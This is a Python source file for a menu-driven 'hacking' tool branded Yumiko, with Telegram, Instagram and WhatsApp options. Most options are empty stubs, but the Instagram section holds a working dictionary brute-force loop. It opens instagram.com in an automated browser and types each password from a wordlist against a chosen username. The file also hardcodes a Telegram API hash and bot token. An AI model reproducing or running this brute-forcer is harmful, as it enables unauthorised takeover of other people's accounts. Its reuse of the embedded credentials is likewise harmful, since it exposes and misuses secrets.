from pyrogram import Client as yumiko, filters as filt
import os
import time
from webbot import Browser
from pynput import *

API_ID = 9276915
API_HASH = "e8145ec48504292485900892fffaf890"
BOT_TOKEN = "6262747338:AAH6vsOF0FfuTVxV2tWLfoyEy1gtWNzy8kk"

app = yumiko("Yumkio", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

black = '\033[30m'
red = '\033[31m'
green = '\033[32m'
orange = '\033[33m'
blue = '\033[34m'
purple = '\033[35m'
cyan = '\033[36m'
lightgrey = '\033[37m'
darkgrey = '\033[90m'
lightred = '\033[91m'
lightgreen = '\033[92m'
yellow = '\033[93m'
lightblue = '\033[94m'
pink = '\033[95m'
lightcyan = '\033[96m'
clear = '\033[0m'
lgreen = '\033[92m'
os.system("clear")
banner = lgreen + '''
                         __.oOo.__
                        /'(  _  )`\
                       / . \/^\/ . \
                      /  _)_`-'_(_  \
                     /.-~   ).(   ~-.\
                    /'     /\_/\     `\
                         . "-V-"

 ,ggg,         gg                                                              
dP""Y8a        88                                       ,dPYb,                 
Yb, `88        88                                       IP'`Yb                 
 `"  88        88                                  gg   I8  8I                 
     88        88                                  ""   I8  8bgg,              
     88        88  gg      gg   ,ggg,,ggg,,ggg,    gg   I8 dP" "8    ,ggggg,   
     88       ,88  I8      8I  ,8" "8P" "8P" "8,   88   I8d8bggP"   dP"  "Y8ggg
     Y8b,___,d888  I8,    ,8I  I8   8I   8I   8I   88   I8P' "Yb,  i8'    ,8I  
      "Y88888P"88,,d8b,  ,d8b,,dP   8I   8I   Yb,_,88,_,d8    `Yb,,d8,   ,d8'  
           ,ad88888P'"Y88P"`Y88P'   8I   8I   `Y88P""Y888P      Y8P"Y8888P"    
          d8P" 88                                                              
        ,d8'   88                                                              
        d8'    88                                                              
        88     88                                                              
        Y8,_ _,88                                                              
         "Y888P"  
Version: v1.0.0         Developed By: YumikoBots         Owner: Santhu Tech
''' + clear
print(" ")
print(banner)


def show_options(title, options):
    print(title)
    for i, option in enumerate(options):
        print(f"{i + 1}. {option}")


def clear_screen():
    if os.name == 'nt':
        _ = os.system('cls')
    else:  # For Linux and Mac
        _ = os.system('clear')


def whatsapp():
    print("Launching Whatsapp...")


def bruteforce():
    print("Launching Bruteforce...")


def telegram():
    while True:
        clear_screen()
        show_options("Telegram", ["Login", "Add Members", "Delete Groups", "Hack Accounts", "Back"])
        choice = input("Enter your choice (1-5): ")
        if choice == "1":
            print("Launching Telegram Login...")
            input("Press Enter to continue...")
        elif choice == "2":
            print("Launching Telegram Add Members...")
            input("Press Enter to continue...")
        elif choice == "3":
            print("Launching Telegram Delete Groups...")
            input("Press Enter to continue...")
        elif choice == "4":
            print("Launching Telegram Hack Accounts...")
            input("Press Enter to continue...")
        elif choice == "5":
            print("Going back to the main menu...")
            break
        else:
            print("Invalid choice. Please try again.")
            input("Press Enter to continue...")


def instagram():
    while True:
        clear_screen()
        show_options("Instagram", ["Brute Force Passwords", "Account Hack", "Gather Account Info", "Back"])
        choice = input("Enter your choice (1-4): ")
        if choice == "1":
            print("Launching Instagram Brute Force Passwords...")
            username = input('Username: ')
            password = input('Choose Dictionary: ')

            file = open(f'{password}.txt', 'r')
            bruteforce = []
            for line in file:
                line = line.strip()
                bruteforce.append(line)
            file.close()

            web = Browser()
            keyboard = Controller()

            web.go_to('www.instagram.com')
            time.sleep(3)
            keyboard.press(Key.enter)
            keyboard.release(Key.enter)
            time.sleep(3)
            keyboard.press(Key.tab)
            keyboard.release(Key.tab)
            time.sleep(3)
            web.type(username)
            keyboard.press(Key.tab)
            keyboard.release(Key.tab)
            for brute in bruteforce:
                web.type(brute, into="Password")
                keyboard.press(Key.enter)
                keyboard.release(Key.enter)

            input("Press Enter to continue...")
        elif choice == "2":
            print("Launching Instagram Account Hack...")
            input("Press Enter to continue...")
        elif choice == "3":
            print("Launching Instagram Gather Account Info...")
            input("Press Enter to continue...")
        elif choice == "4":
            print("Going back to the main menu...")
            break
        else:
            print("Invalid choice. Please try again.")
            input("Press Enter to continue...")


clear_screen()
menu_options = ["Telegram", "Instagram", "WhatsApp", "Brute Force"]
while True:
    show_options("Main Menu", menu_options)
    choice = input("Enter your choice (1-{}): ".format(len(menu_options)))

    if choice == "1":
        telegram()
        menu_options.remove("Telegram")
    elif choice == "2":
        instagram()
    elif choice == "3":
        print("Launching WhatsApp...")
        input("Press Enter to continue...")
    elif choice == "4":
        print("Launching Bruteforce...")
        input("Press Enter to continue...")
        break
    else:
        print("Invalid choice. Please try again.")

    input("Press Enter to continue...")
    clear_screen()
